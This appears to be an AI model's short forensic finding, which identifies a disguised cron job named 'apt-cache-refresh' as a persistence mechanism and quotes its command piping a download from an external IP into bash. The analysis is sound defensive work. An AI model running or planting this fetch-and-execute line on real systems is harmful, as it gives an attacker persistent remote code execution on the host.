content.text:
**Yes**, one persistence mechanism was found:

**`etc/cron.daily/apt-cache-refresh`** — A malicious daily cron job that masquerades as a legitimate package cache refresher but contains the command:
```bash
curl -s http://203.0.113.7/u | bash
```

This is a **remote code execution persistence mechanism** that executes a payload downloaded from an external IP address (203.0.113.7) every day. This allows an attacker to maintain access and execute arbitrary commands on the server on a scheduled basis.
